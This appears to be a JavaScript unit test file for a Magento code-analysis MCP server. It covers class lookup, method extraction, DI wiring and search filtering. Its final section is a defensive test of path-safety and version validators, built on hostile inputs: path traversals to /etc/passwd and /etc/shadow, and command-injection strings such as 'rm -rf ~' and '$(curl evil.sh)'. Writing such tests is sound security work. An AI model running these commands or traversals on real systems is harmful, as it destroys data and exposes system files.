  const saveLines = saveSnippet.split('\n');
  assertEq(saveLines.length, 3, 'maxLines=3 limits output to 3 lines');

  const missing = readMethodSnippet(phpFile, 'nonExistentMethod');
  assertEq(missing, null, 'nonexistent method returns null');

  const badFile = readMethodSnippet('/nonexistent/path.php', 'execute');
  assertEq(badFile, null, 'nonexistent file returns null');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── findClassFile Tests ──────────────────────────────────────

function testFindClassFile() {
  console.log('\n── findClassFile ──');

  const tmpDir = path.join(__dirname, 'tmp_classfile_test');
  const vendorDir = path.join(tmpDir, 'vendor', 'acme', 'Module', 'Model');
  const appDir = path.join(tmpDir, 'app', 'code', 'Custom', 'Module', 'Model');
  mkdirSync(vendorDir, { recursive: true });
  mkdirSync(appDir, { recursive: true });
  writeFileSync(path.join(vendorDir, 'Product.php'), '<?php class Product {}');
  writeFileSync(path.join(appDir, 'Order.php'), '<?php class Order {}');

  function findClassFile(root, className) {
    if (!className) return '';
    const parts = className.replace(/\\\\/g, '\\').split('\\');
    if (parts.length < 3) return '';
    const vendor = parts[0].toLowerCase();
    const candidates = [
      path.join(root, 'vendor', vendor, parts.slice(1).join('/') + '.php'),
      path.join(root, 'app/code', parts.join('/') + '.php'),
    ];
    for (const candidate of candidates) {
      if (existsSync(candidate)) return candidate;
    }
    return '';
  }

  const vendorResult = findClassFile(tmpDir, 'Acme\\Module\\Model\\Product');
  assert(vendorResult.includes('Product.php'), 'resolves vendor class to file');

  const appResult = findClassFile(tmpDir, 'Custom\\Module\\Model\\Order');
  assert(appResult.includes('Order.php'), 'resolves app/code class to file');

  const shortResult = findClassFile(tmpDir, 'Foo\\Bar');
  assertEq(shortResult, '', 'short class name returns empty');

  const noResult = findClassFile(tmpDir, 'Acme\\Module\\Model\\NonExistent');
  assertEq(noResult, '', 'non-existent class returns empty');

  assertEq(findClassFile(tmpDir, ''), '', 'empty class name returns empty');
  assertEq(findClassFile(tmpDir, null), '', 'null class name returns empty');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── Run All ───────────────────────────────────────────────────

// ─── Precise Search Filter Tests ──────────────────────────────

function testPreciseSearchFilter() {
  console.log('\n── Precise Search Filter ──');

  // Simulate the precise filter logic from magento_search
  function preciseFilter(results, query) {
    const queryTerms = query.toLowerCase().split(/\s+/).filter(t => t.length > 2);
    return results.filter(r => {
      const haystack = [r.searchText, r.className, r.methodName, r.path, ...(r.methods || [])]
        .filter(Boolean).join(' ').toLowerCase();
      return queryTerms.some(term => haystack.includes(term));
    });
  }

  const mockResults = [
    { className: 'Subtotal', searchText: 'gift card subtotal condition validate', path: 'Model/Condition/Subtotal.php', methods: ['validate'] },
    { className: 'TotalsCollector', searchText: 'totals collector collect quote', path: 'Model/Quote/TotalsCollector.php', methods: ['collect'] },
    { className: 'ProductRepository', searchText: 'product repository save catalog', path: 'Model/ProductRepository.php', methods: ['save'] },
    { className: 'CartManagement', searchText: 'cart management place order checkout', path: 'Model/CartManagement.php', methods: ['placeOrder'] },
  ];

  // Query: "gift card subtotal" — should only match Subtotal
  const result1 = preciseFilter(mockResults, 'gift card subtotal');
  assertEq(result1.length, 1, 'preciseFilter: "gift card subtotal" matches only 1 result');
  assertEq(result1[0].className, 'Subtotal', 'preciseFilter: matches Subtotal class');

  // Query: "collect totals" — should match TotalsCollector
  const result2 = preciseFilter(mockResults, 'collect totals');
  assertEq(result2.length, 1, 'preciseFilter: "collect totals" matches TotalsCollector');

  // Query: "validate condition" — should match Subtotal (has both in searchText)
  const result3 = preciseFilter(mockResults, 'validate condition');
  assert(result3.some(r => r.className === 'Subtotal'), 'preciseFilter: "validate condition" includes Subtotal');

  // Short terms (<=2 chars) are excluded from filtering
  const result4 = preciseFilter(mockResults, 'a b c');
  assertEq(result4.length, 0, 'preciseFilter: all short terms results in no filter match');

  // Empty results stay empty
  const result5 = preciseFilter([], 'anything');
  assertEq(result5.length, 0, 'preciseFilter: empty input returns empty');
}

// ─── Runtime Caller Detection Tests ──────────────────────────

function testRuntimeCallerDetection() {
  console.log('\n── Runtime Caller Detection ──');

  // Simulate the runtime caller detection logic from analyzeImpact
  function detectRuntimeCallers(content, shortName, className) {
    const callers = [];
    const escapedShort = shortName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const hasUse = content.includes('use ' + className) || content.includes('\\' + className);
    if (!hasUse) return callers;

    const ctorMatch = content.match(/function\s+__construct\s*\(([\s\S]*?)\)\s*[{:]/);
    if (!ctorMatch) return callers;

    const paramRegex = new RegExp('(?:' + escapedShort + '|' + className.replace(/\\/g, '\\\\') + ')\\s+\\$(\\w+)', 'g');
    let pm;
    while ((pm = paramRegex.exec(ctorMatch[1])) !== null) {
      const propName = pm[1];
      const callRegex = new RegExp('\\$this->' + propName + '->(\\w+)\\s*\\(', 'g');
      let cm;
      while ((cm = callRegex.exec(content)) !== null) {
        callers.push({ property: propName, calledMethod: cm[1] });
      }
    }
    return callers;
  }

  // Test 1: Detects runtime callers from constructor injection
  const phpContent = `<?php
namespace Acme\\Foo\\Model;
use Acme\\Foo\\Api\\TotalsCollectorInterface;
class Discount {
    private $totalsCollector;
    public function __construct(
        TotalsCollectorInterface $totalsCollector
    ) {
        $this->totalsCollector = $totalsCollector;
    }
    public function calculate() {
        $result = $this->totalsCollector->collect($this->quote);
        $this->totalsCollector->reset();
    }
}`;

  const callers1 = detectRuntimeCallers(phpContent, 'TotalsCollectorInterface', 'Acme\\Foo\\Api\\TotalsCollectorInterface');
  assertEq(callers1.length, 2, 'runtimeCallers: detects 2 method calls on injected dependency');
  assert(callers1.some(c => c.calledMethod === 'collect'), 'runtimeCallers: detects collect() call');
  assert(callers1.some(c => c.calledMethod === 'reset'), 'runtimeCallers: detects reset() call');
  assertEq(callers1[0].property, 'totalsCollector', 'runtimeCallers: correct property name');

  // Test 2: No callers when class not imported
  const phpNoUse = `<?php
namespace Acme\\Bar;
class Other {
    public function __construct(SomeOtherClass $dep) {
        $this->dep = $dep;
    }
    public function run() { $this->dep->execute(); }
}`;
  const callers2 = detectRuntimeCallers(phpNoUse, 'TotalsCollectorInterface', 'Acme\\Foo\\Api\\TotalsCollectorInterface');
  assertEq(callers2.length, 0, 'runtimeCallers: no callers when class not imported');

  // Test 3: No callers when no constructor
  const phpNoCtor = `<?php
use Acme\\Foo\\Api\\TotalsCollectorInterface;
class Simple {
    public function run() { return true; }
}`;
  const callers3 = detectRuntimeCallers(phpNoCtor, 'TotalsCollectorInterface', 'Acme\\Foo\\Api\\TotalsCollectorInterface');
  assertEq(callers3.length, 0, 'runtimeCallers: no callers when no constructor');
}

// ─── readFullMethodBody Tests ─────────────────────────────────

function testReadFullMethodBody() {
  console.log('\n── readFullMethodBody ──');

  const tmpDir = path.join(__dirname, 'tmp_fullmethod_test');
  mkdirSync(tmpDir, { recursive: true });
  const phpFile = path.join(tmpDir, 'ViewPlugin.php');
  writeFileSync(phpFile, [
    '<?php',
    'namespace Acme\\OrderEdit\\Plugin;',
    '',
    'class ViewPlugin',
    '{',
    '    public function afterAddButton($subject, $result, $buttonId)',
    '    {',
    '        if ($buttonId === "order_edit") {',
    '            $type = $subject->getOrder()->getData("order_type");',
    '            if ($type === "reservation") {',
    '                $subject->removeButton($buttonId);',
    '            }',
    '        }',
    '        return $result;',
    '    }',
    '',
    '    private function getNonEditableTypes($order)',
    '    {',
    '        return array_keys(',
    '            $order->getResource()->aggregateProductsByTypes(',
    '                $order->getId(),',
    '                $this->salesConfig->getAvailableProductTypes(),',
    '                false',
    '            )',
    '        );',
    '    }',
    '}'
  ].join('\n'));

  // Inline implementation matching mcp-server.js readFullMethodBody
  function readFullMethodBody(filePath, methodName, maxLines = 60) {
    let content;
    try { content = readFileSync(filePath, 'utf-8'); } catch { return null; }
    const lines = content.split('\n');
    for (let i = 0; i < lines.length; i++) {
      if (lines[i].includes(`function ${methodName}(`)) {
        let braceCount = 0;
        let started = false;
        for (let j = i; j < lines.length && j < i + maxLines; j++) {
          for (const ch of lines[j]) {
            if (ch === '{') { braceCount++; started = true; }
            if (ch === '}') braceCount--;
          }
          if (started && braceCount <= 0) {
            return lines.slice(i, j + 1).join('\n');
          }
        }
        return lines.slice(i, Math.min(i + maxLines, lines.length)).join('\n');
      }
    }
    return null;
  }

  // Test 1: Extract complete afterAddButton (9 lines with braces)
  const afterBody = readFullMethodBody(phpFile, 'afterAddButton');
  assert(afterBody !== null, 'readFullMethodBody: finds afterAddButton');
  assert(afterBody.includes('function afterAddButton'), 'contains function signature');
  assert(afterBody.includes('removeButton'), 'contains removeButton call');
  assert(afterBody.includes('return $result;'), 'contains return statement');
  // Should end at the closing brace, not continue to getNonEditableTypes
  assert(!afterBody.includes('getNonEditableTypes'), 'does NOT leak into next method');

  // Test 2: Extract complete getNonEditableTypes (multi-line call chain)
  const getBody = readFullMethodBody(phpFile, 'getNonEditableTypes');
  assert(getBody !== null, 'readFullMethodBody: finds getNonEditableTypes');
  assert(getBody.includes('aggregateProductsByTypes'), 'contains nested call');
  assert(getBody.includes('getAvailableProductTypes'), 'contains full method body');

  // Test 3: Nonexistent method returns null
  const missing = readFullMethodBody(phpFile, 'nonExistent');
  assertEq(missing, null, 'nonexistent method returns null');

  // Test 4: Nonexistent file returns null
  const badFile = readFullMethodBody('/no/such/file.php', 'foo');
  assertEq(badFile, null, 'nonexistent file returns null');

  // Test 5: maxLines safety limit
  const limited = readFullMethodBody(phpFile, 'afterAddButton', 3);
  assert(limited !== null, 'maxLines safety: returns partial content');
  const limitedLines = limited.split('\n');
  assertEq(limitedLines.length, 3, 'maxLines=3 limits to 3 lines');

  rmSync(tmpDir, { recursive: true, force: true });
}

// ─── findDiWiring FQCN Disambiguation Tests ──────────────────

async function testFindDiWiringFqcn() {
  console.log('\n── findDiWiring FQCN disambiguation ──');

  const tmpDir = path.join(__dirname, '__fixtures_di_fqcn');
  try { rmSync(tmpDir, { recursive: true }); } catch {}
  // Create two modules with same-named class ViewPlugin
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-order-edit/etc/adminhtml'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-order-edit/Plugin'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-subscription/etc'), { recursive: true });
  mkdirSync(path.join(tmpDir, 'vendor/acme/module-subscription/Plugin'), { recursive: true });

  // Module A: OrderEdit ViewPlugin
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-order-edit/etc/adminhtml/di.xml'),
    `<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type name="Acme\\Sales\\Block\\Order\\View">
    <plugin name="order_edit_view" type="Acme\\OrderEdit\\Plugin\\ViewPlugin"/>
  </type>
</config>`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-order-edit/Plugin/ViewPlugin.php'),
    `<?php\nnamespace Acme\\OrderEdit\\Plugin;\nclass ViewPlugin {\n    public function __construct(\n        \\Acme\\Sales\\Model\\Config $salesConfig\n    ) {}\n}\n`);

  // Module B: Subscription ViewPlugin (different class, same short name)
  writeFileSync(path.join(tmpDir, 'vendor/acme/module-subscription/etc/di.xml'),
    `<config xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <type name="Acme\\Framework\\Mview\\ViewPlugin">
    <plugin name="sub_view" type="Acme\\Subscription\\Plugin\\ViewPlugin"/>
  </type>
</config>`);

  writeFileSync(path.join(tmpDir, 'vendor/acme/module-subscription/Plugin/ViewPlugin.php'),
    `<?php\nnamespace Acme\\Subscription\\Plugin;\nclass ViewPlugin {\n    public function __construct(\n        \\Acme\\Subscription\\Model\\SubscriptionFactory $subscriptionFactory\n    ) {}\n}\n`);

  const { glob: globFn } = await import('glob');

  // Helper that mimics findDiWiring FQCN logic
  async function findDiWiringTest(className) {
    const root = tmpDir;
    const shortName = className.split('\\').pop();
    const shortLower = shortName.toLowerCase();
    const hasFqcn = className.includes('\\');
    const fqcnNormalized = hasFqcn ? className.replace(/\\\\/g, '\\') : null;
    const fqcnLower = fqcnNormalized ? fqcnNormalized.toLowerCase() : null;

    function matchesClass(xmlClassName) {
      const xmlLower = xmlClassName.toLowerCase().replace(/\\\\/g, '\\');
      if (fqcnLower) {
        return xmlLower === fqcnLower || xmlLower.endsWith('\\' + fqcnLower);
      }
      return xmlLower.includes(shortLower);
    }

    const result = { plugins: [], constructorArguments: [] };
    const diFiles = await globFn('**/etc/**/di.xml', { cwd: root, absolute: true, nodir: true });

    for (const diFile of diFiles) {
      const content = readFileSync(diFile, 'utf-8');
      if (!content.toLowerCase().includes(shortLower)) continue;
      const typeBlockRegex = /<type\s+name="([^"]+)"[^>]*>([\s\S]*?)<\/type>/g;
      let typeMatch;
      while ((typeMatch = typeBlockRegex.exec(content)) !== null) {
        if (!matchesClass(typeMatch[1])) continue;
        const pluginRegex = /<plugin\s+name="([^"]+)"[^>]*type="([^"]+)"[^>]*/g;
        let pMatch;
        while ((pMatch = pluginRegex.exec(typeMatch[2])) !== null) {
          result.plugins.push({ target: typeMatch[1], pluginClass: pMatch[2] });
        }
      }
    }

    // PHP constructor with FQCN verification
    const phpFiles = await globFn(`**/${shortName}.php`, { cwd: root, absolute: true, nodir: true });
    for (const phpFile of phpFiles) {
      const content = readFileSync(phpFile, 'utf-8');
      const classMatch = content.match(/(?:class|abstract\s+class)\s+(\w+)/);
      if (!classMatch || classMatch[1] !== shortName) continue;
      if (fqcnNormalized) {
        const nsMatch = content.match(/namespace\s+([\w\\]+)\s*;/);
        if (nsMatch) {
          const fileFqcn = (nsMatch[1] + '\\' + shortName).toLowerCase();
          if (fileFqcn !== fqcnLower) continue;
        }
      }
      const ctorMatch = content.match(/function\s+__construct\s*\(([\s\S]*?)\)\s*[{:]/);
      if (ctorMatch) {
        const paramRegex = /(?:([\w\\]+)\s+)?(\$\w+)/g;
        let pm;
        while ((pm = paramRegex.exec(ctorMatch[1])) !== null) {
          result.constructorArguments.push({ typeHint: pm[1] || null, variable: pm[2] });
        }
      }
      break;
    }
    return result;
  }

  // Test 1: Short name "ViewPlugin" — Module B type is "Acme\\Framework\\Mview\\ViewPlugin" (matches),
  // Module A type is "Acme\\Sales\\Block\\Order\\View" (does not contain "viewplugin")
  const shortResult = await findDiWiringTest('ViewPlugin');
  assertEq(shortResult.plugins.length, 1, 'short name: finds 1 plugin (only type name containing ViewPlugin)');
  assert(shortResult.constructorArguments.length > 0, 'short name: finds some constructor args (first match)');

  // Test 2: FQCN for OrderEdit ViewPlugin — only matches OrderEdit constructor
  const orderEditResult = await findDiWiringTest('Acme\\OrderEdit\\Plugin\\ViewPlugin');
  // The di.xml type is "Acme\\Sales\\Block\\Order\\View", not this class, so 0 plugins
  assertEq(orderEditResult.plugins.length, 0, 'FQCN OrderEdit: no plugins (target is different class)');
  assertEq(orderEditResult.constructorArguments.length, 1, 'FQCN OrderEdit: finds 1 constructor arg');
  assert(
    orderEditResult.constructorArguments[0]?.variable === '$salesConfig',
    'FQCN OrderEdit: correct param is $salesConfig'
  );

  // Test 3: FQCN for Subscription ViewPlugin — only matches Subscription constructor
  const subResult = await findDiWiringTest('Acme\\Subscription\\Plugin\\ViewPlugin');
  assertEq(subResult.constructorArguments.length, 1, 'FQCN Subscription: finds 1 constructor arg');
  assert(
    subResult.constructorArguments[0]?.variable === '$subscriptionFactory',
    'FQCN Subscription: correct param is $subscriptionFactory'
  );

  try { rmSync(tmpDir, { recursive: true }); } catch {}
}

async function main() {
  console.log('╔═══════════════════════════════════════════════════════════╗');
  console.log('║            MAGECTOR UNIT TESTS                          ║');
  console.log('╚═══════════════════════════════════════════════════════════╝');

  testCliArgumentParsing();
  testErrorPatterns();
  testDiXmlParsing();
  testSubsystemConfiguration();
  await testMagentoPatterns();
  testExtractJson();
  testNormalizeResult();
  testRerank();
  testDetectEntryType();
  testFormatSearchResults();
  testBuildTraceSummary();
  await testMagentoPatternsExtended();
  testErrorPatternEdgeCases();
  testCacheLogic();
  await testDiXmlMultiArea();
  testBm25Scoring();
  testQueryExpansion();
  testModuleFiltering();
  await testLayoutXmlParsing();
  await testEventFlowParsing();
  await testTestFinder();
  testImpactAnalysisLogic();
  testReindexTempPathLogic();
  testRustSearchAsyncGuards();
  testReindexDeduplication();
  testSingletonAndWarmup();
  await testStdinCleanup();
  await testFindImplementors();
  await testFindCallers();
  await testFindDiWiring();
  await testTraceCallChain();
  await testTraceCallChainInheritance();
  await testTraceDataFlow();
  await testFindEventDispatchers();
  testModuleFilterArray();
  testNewMcpToolDefinitions();
  testSetupScriptDetection();
  testSqlTableReferenceDetection();
  await testExtractPluginMethods();
  await testParseFieldsetXml();
  testReadMethodSnippet();
  testReadFullMethodBody();
  await testFindDiWiringFqcn();
  testFindClassFile();
  testPreciseSearchFilter();
  testRuntimeCallerDetection();
  testFormatSearchResultsTruncation();
  await testPluginMethodBodies();
  await testDiXmlSessionCache();
  await testFindPluginPartialMatch();
  await testFindObserverEventsXml();
  testServePidVersion();
  await testFindClassFilesystemFallback();
  await testModuleStructureCamelCase();
  testCliVersion();
  await testMagentoGrep();
  await testMagentoRead();
  testGrepDefaultContext();
  await testGrepFilesOnly();
  await testAstSearch();
  await testFindDataObjectIssues();
  await testReadMethodNameHint();
  testHasNullGuard();
  testEnrichChainRegex();
  testExpandIncludePattern();
  testSafePath();

  console.log('\n════════════════════════════════════════════════════════════');
  console.log(`\n  Results: ${passed} passed, ${failed} failed`);
  console.log(`  Total:   ${passed + failed} tests\n`);

  if (failed > 0) {
    console.log('  FAILED');
  } else {
    console.log('  All tests passed');
  }

  process.exit(failed > 0 ? 1 : 0);
}

// ─── hasNullGuard Tests ──────────────────────────────────────────

function testHasNullGuard() {
  console.log('\n── hasNullGuard ──');

  function mockHasNullGuard(lines, matchLineIdx, receiverExpr, guardRadius = 6) {
    const start = Math.max(0, matchLineIdx - guardRadius);
    const end = Math.min(lines.length - 1, matchLineIdx + guardRadius);
    const matchLine = lines[matchLineIdx] || '';
    const window = lines.slice(start, end + 1).join('\n');
    // ?-> only counts if it's on the same line as the chain
    if (matchLine.includes('?->')) return true;
    if (/\?\?|\?:/.test(window)) return true;
    if (receiverExpr) {
      const esc = receiverExpr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      if (new RegExp('(?:is_null\\s*\\(\\s*' + esc + '|' + esc + '\\s*(?:===|!==)\\s*null|!\\s*' + esc + '\\s*[,)]|isset\\s*\\(\\s*' + esc + ')', 'i').test(window)) return true;
    }
    return false;
  }

  const unsafeLines = ['    public function execute($order) {', '        $m = $order->getPayment()->getMethod();', '        return $m;', '    }'];
  assert(!mockHasNullGuard(unsafeLines, 1, '$order'), 'hasNullGuard: no guard for direct chain');

  const safeExplicit = ['    public function execute($order) {', '        $payment = $order->getPayment();', '        if ($payment !== null) {', '            $m = $payment->getMethod();', '        }', '    }'];
  assert(mockHasNullGuard(safeExplicit, 3, '$payment'), 'hasNullGuard: !== null detected');

  const safeNullsafe = ['    $m = $order->getPayment()?->getMethod();'];
  assert(mockHasNullGuard(safeNullsafe, 0, '$order'), 'hasNullGuard: ?-> detected');

  const safeIsNull = ['    if (!is_null($payment)) {', '        return $payment->getMethod();', '    }'];
  assert(mockHasNullGuard(safeIsNull, 1, '$payment'), 'hasNullGuard: is_null() detected');

  // P2 regression: ?-> on a DIFFERENT variable in the window must NOT count as a guard
  const falsePositiveLines = [
    '    $name = $customer?->getName();',
    '    $method = $order->getPayment()->getMethod();',
    '    return $method;'
  ];
  assert(!mockHasNullGuard(falsePositiveLines, 1, '$order'), 'hasNullGuard: ?-> on different variable is not a guard');
}

// ─── enrichMethodChains regex Tests ─────────────────────────────

function testEnrichChainRegex() {
  console.log('\n── enrichMethodChains regex ──');

  const chainRegex = /(\$\w+)\s*->\s*(\w+)\s*\([^)]{0,60}\)\s*->\s*(\w+)\s*\(/g;

  const unsafeCode = '        $m = $order->getPayment()->getMethod();';
  const matches = [];
  let m;
  while ((m = chainRegex.exec(unsafeCode)) !== null) matches.push({ recv: m[1], first: m[2], second: m[3] });
  assertEq(matches.length, 1, 'enrich regex: finds 1 chain');
  assertEq(matches[0].recv, '$order', 'enrich regex: receiver is $order');
  assertEq(matches[0].first, 'getPayment', 'enrich regex: firstMethod is getPayment');
  assertEq(matches[0].second, 'getMethod', 'enrich regex: secondMethod is getMethod');

  // With args in first call — receiver must be direct $var (not property access)
  chainRegex.lastIndex = 0;
  const withArgs = '        $item = $repo->load($id)->getSku();';
  const m2 = [];
  while ((m = chainRegex.exec(withArgs)) !== null) m2.push(m[2]);
  assertEq(m2.length, 1, 'enrich regex: finds chain with args in first call');
  assertEq(m2[0], 'load', 'enrich regex: firstMethod is load');

  // No chain - just single call
  chainRegex.lastIndex = 0;
  const single = '        $val = $order->getPayment();';
  const m3 = [];
  while ((m = chainRegex.exec(single)) !== null) m3.push(m);
  assertEq(m3.length, 0, 'enrich regex: no match for single call');
}

// ─── expandIncludePattern Tests ──────────────────────────────────

function testExpandIncludePattern() {
  console.log('\n── expandIncludePattern ──');

  // Re-implement the function from mcp-server.js (not exported)
  function expandIncludePattern(include) {
    const parts = [];
    let depth = 0, current = '';
    for (const ch of include) {
      if (ch === '{') depth++;
      if (ch === '}') depth--;
      if (ch === ',' && depth === 0) {
        parts.push(current.trim());
        current = '';
      } else {
        current += ch;
      }
    }
    if (current.trim()) parts.push(current.trim());
    const patterns = [];
    const braceRegex = /^(.*?)\{([^}]+)\}(.*)$/;
    for (const part of parts) {
      const m = part.match(braceRegex);
      if (m) {
        for (const alt of m[2].split(',').map(a => a.trim())) {
          patterns.push(m[1] + alt + m[3]);
        }
      } else {
        patterns.push(part);
      }
    }
    return patterns;
  }

  // Simple pattern — no braces
  const r1 = expandIncludePattern('*.php');
  assertEq(r1.length, 1, 'expand: simple pattern returns 1');
  assertEq(r1[0], '*.php', 'expand: simple pattern unchanged');

  // Comma-separated patterns
  const r2 = expandIncludePattern('*.php, *.xml');
  assertEq(r2.length, 2, 'expand: comma-separated returns 2');
  assertEq(r2[0], '*.php', 'expand: first comma pattern');
  assertEq(r2[1], '*.xml', 'expand: second comma pattern');

  // Brace expansion — the bug that was fixed
  const r3 = expandIncludePattern('*.{php,xml,graphqls}');
  assertEq(r3.length, 3, 'expand: brace with 3 alternatives');
  assertEq(r3[0], '*.php', 'expand: brace first');
  assertEq(r3[1], '*.xml', 'expand: brace second');
  assertEq(r3[2], '*.graphqls', 'expand: brace third');

  // Two alternatives
  const r4 = expandIncludePattern('*.{php,xml}');
  assertEq(r4.length, 2, 'expand: brace with 2 alternatives');
  assertEq(r4[0], '*.php', 'expand: two-brace first');
  assertEq(r4[1], '*.xml', 'expand: two-brace second');

  // Mixed: brace + comma-separated
  const r5 = expandIncludePattern('*.{php,xml}, *.phtml');
  assertEq(r5.length, 3, 'expand: mixed brace + comma returns 3');
  assertEq(r5[0], '*.php', 'expand: mixed first');
  assertEq(r5[1], '*.xml', 'expand: mixed second');
  assertEq(r5[2], '*.phtml', 'expand: mixed third');
}

// ─── Path Safety (safePath / safeRelPath) ───────────────────────
// These mirror the helpers in src/mcp-server.js. The handlers for
// magento_read, magento_grep and magento_ast_search funnel all
// user-supplied paths through them, so a regression here is a
// silent path-traversal vulnerability.

function testSafePath() {
  console.log('\n── safePath / safeRelPath ──');

  // Re-implement the helpers from mcp-server.js (not exported).
  function safePath(root, rel) {
    if (rel === undefined || rel === null) return null;
    const rootAbs = path.resolve(root);
    const joined = path.resolve(rootAbs, String(rel));
    if (joined !== rootAbs && !joined.startsWith(rootAbs + path.sep)) return null;
    return joined;
  }
  function safeRelPath(root, rel) {
    const abs = safePath(root, rel);
    if (!abs) return null;
    const r = path.relative(path.resolve(root), abs);
    return r === '' ? '.' : r;
  }

  const root = '/srv/project';

  // Benign paths
  assertEq(safePath(root, 'vendor/foo/Bar.php'),
    '/srv/project/vendor/foo/Bar.php',
    'safePath: accepts relative subpath');
  assertEq(safePath(root, './app/code/Foo.php'),
    '/srv/project/app/code/Foo.php',
    'safePath: normalizes leading ./');
  assertEq(safePath(root, 'vendor/foo/../bar/Baz.php'),
    '/srv/project/vendor/bar/Baz.php',
    'safePath: allows internal .. that stays inside root');
  assertEq(safePath(root, '.'), '/srv/project', 'safePath: root itself');
  assertEq(safePath(root, ''), '/srv/project', 'safePath: empty string resolves to root');

  // Escapes must return null
  assertEq(safePath(root, '../etc/passwd'), null, 'safePath: rejects ../etc/passwd');
  assertEq(safePath(root, '../../etc/passwd'), null, 'safePath: rejects deeper traversal');
  assertEq(safePath(root, 'vendor/../../etc/shadow'), null,
    'safePath: rejects traversal via subpath');
  assertEq(safePath(root, '/etc/passwd'), null,
    'safePath: rejects absolute path to /etc');
  assertEq(safePath(root, '/srv/project-other/file'), null,
    'safePath: rejects sibling directory (prefix-match bypass)');
  assertEq(safePath(root, null), null, 'safePath: null is rejected');
  assertEq(safePath(root, undefined), null, 'safePath: undefined is rejected');

  // Relative form used by grep/semgrep callers
  assertEq(safeRelPath(root, 'vendor/foo'), 'vendor/foo',
    'safeRelPath: returns clean relative path');
  assertEq(safeRelPath(root, '.'), '.', 'safeRelPath: root stays as "."');
  assertEq(safeRelPath(root, ''), '.', 'safeRelPath: empty string maps to "."');
  assertEq(safeRelPath(root, '../etc'), null, 'safeRelPath: rejects traversal');
  assertEq(safeRelPath(root, '/etc/passwd'), null, 'safeRelPath: rejects absolute');

  // Update.js safe-version validator must reject shell metacharacters.
  function isSafeVersion(v) {
    return typeof v === 'string' && /^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$/.test(v);
  }
  assert(isSafeVersion('2.15.0'), 'isSafeVersion: accepts 2.15.0');
  assert(isSafeVersion('2.15.0-rc.1'), 'isSafeVersion: accepts prerelease');
  assert(isSafeVersion('10.0.0-beta.12'), 'isSafeVersion: accepts multi-digit');
  assert(!isSafeVersion('2.15.0; rm -rf ~'), 'isSafeVersion: rejects shell injection');
  assert(!isSafeVersion('2.15.0 && echo pwn'), 'isSafeVersion: rejects &&');
  assert(!isSafeVersion('$(curl evil.sh)'), 'isSafeVersion: rejects command substitution');
  assert(!isSafeVersion(''), 'isSafeVersion: rejects empty string');
  assert(!isSafeVersion(null), 'isSafeVersion: rejects null');
  assert(!isSafeVersion('1.2'), 'isSafeVersion: rejects incomplete semver');
}

main().catch((e) => {
  console.error('Test runner error:', e);
  process.exit(1);
});
